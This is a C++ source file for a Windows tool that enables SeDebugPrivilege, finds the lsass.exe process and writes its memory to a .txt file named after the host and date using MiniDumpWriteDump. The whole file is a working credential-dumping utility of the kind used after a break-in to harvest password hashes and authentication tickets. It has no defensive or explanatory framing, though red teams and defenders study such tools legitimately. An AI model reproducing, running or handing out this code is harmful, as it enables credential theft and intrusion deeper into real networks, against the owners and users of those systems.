#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma warning(disable : 4996)

#include <iostream>
#include <windows.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <sstream>
#define UNCLEN 512

using namespace std;

// Checks if program is running as an elevated process
bool IsElevatedProcess()
{
    bool isElevated;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
    {
        TOKEN_ELEVATION elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &token_check))
        {
            isElevated = elevation.TokenIsElevated;
        }
    }

    if (token)
    {
        CloseHandle(token);
    }

    return isElevated;
}

DWORD getProcessPid()
{
    DWORD processPID = 0;
    HANDLE snap_handler = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCWSTR processName = L"";

    if (Process32First(snap_handler, &processEntry))
    {
        string lsass_processname = "lsass.exe";
        std::wstring processname(lsass_processname.begin(), lsass_processname.end());
        const wchar_t* szName = processname.c_str();

        while (_wcsicmp(processName, szName) != 0)
        {
            Process32Next(snap_handler, &processEntry);
            processName = processEntry.szExeFile;
            processPID = processEntry.th32ProcessID;
        }
    }

    return processPID;
}

bool SetPrivilege()
{
    string priv_name = "SeDebugPrivilege";
    std::wstring privilege_name(priv_name.begin(), priv_name.end());
    const wchar_t* privName = privilege_name.c_str();

    TOKEN_PRIVILEGES priv = { 0,0,0,0 };
    HANDLE tokenPriv = NULL;
    LUID luid = { 0,0 };
    bool Status = true;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenPriv))
    {
        Status = false;
        goto EXIT;
    }

    if (!LookupPrivilegeValueW(0, privName, &luid))
    {
        Status = false;
        goto EXIT;
    }

    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

    if (!AdjustTokenPrivileges(tokenPriv, false, &priv, 0, 0, 0))
    {
        Status = false;
        goto EXIT;
    }

EXIT:
    if (tokenPriv) { CloseHandle(tokenPriv); }
    return Status;
}

string getHostname()
{
    TCHAR computerName[UNCLEN + 1];
    DWORD computername_len = UNCLEN + 1;

    GetComputerName((TCHAR*)computerName, &computername_len);

    wstring wstringcomputername(&computerName[0]);
    string stringcomputername(wstringcomputername.begin(), wstringcomputername.end());

    return stringcomputername;
}

string getFileName(string hostname)
{
    string fileExt = ".txt";
    time_t t = time(NULL);
    tm* currentTime = localtime(&t);

    stringstream filenamestream;
    string filename;
    
    filenamestream << hostname;
    filenamestream << "_";
    filenamestream << currentTime->tm_mon + 1;
    filenamestream << "-";
    filenamestream << currentTime->tm_mday;
    filenamestream << "-";
    filenamestream << currentTime->tm_year + 1900;
    filenamestream << fileExt;
    filenamestream >> filename;
    
    return filename;
}

int main(int argc, char** argv)
{

    string filename;
    bool privAdded = SetPrivilege();

    if (!IsElevatedProcess())
    {
        wcout << "[Error] Requires administrative privileges to execute" << endl;
        return 1;
    }

    // Obtains LSASS Process PID
    DWORD processPID = getProcessPid();
    wcout << "[SUCCESS] Process PID: " << processPID << endl;

    if (argc >= 2)
    {
        filename = argv[1]; // Allows user to create a custom output name
    }
    else
    {
        string hostname = getHostname();
        filename = getFileName(hostname);
    }

    std::wstring stemp = std::wstring(filename.begin(), filename.end());
    LPCWSTR pointer_filename = stemp.c_str();

    HANDLE output = CreateFile(pointer_filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // Creates/overwrites existing .txt file for LSASS data

    if (!privAdded)
    {
        wcout << "[ERROR] Privileges could not be properly set" << endl;
        return 1;
    }

    // Process handler
    DWORD processAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
    HANDLE processHandler = OpenProcess(processAllow, 0, processPID);

    // Handles the actual process dumping
    if (processHandler && processHandler != INVALID_HANDLE_VALUE)
    {
        wcout << "Process handler successfully created" << endl;

        bool isDumped = MiniDumpWriteDump(processHandler, processPID, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);

        if (isDumped)
        {
            cout << "[SUCCESS] Successfully dumped core LSASS information for PID: " << processPID << endl;
            cout << "[SUCCESS] All data dumped to " << filename << endl;
        }
        else
        {
            cout << "[ERROR] Unable to dump process" << endl;
            return 1;
        }
    }
    else
    {
        wcout << "[ERROR] Unable to create handler process [NULL REFERENCE]" << endl;
        return 1;
    }

    return 0;
}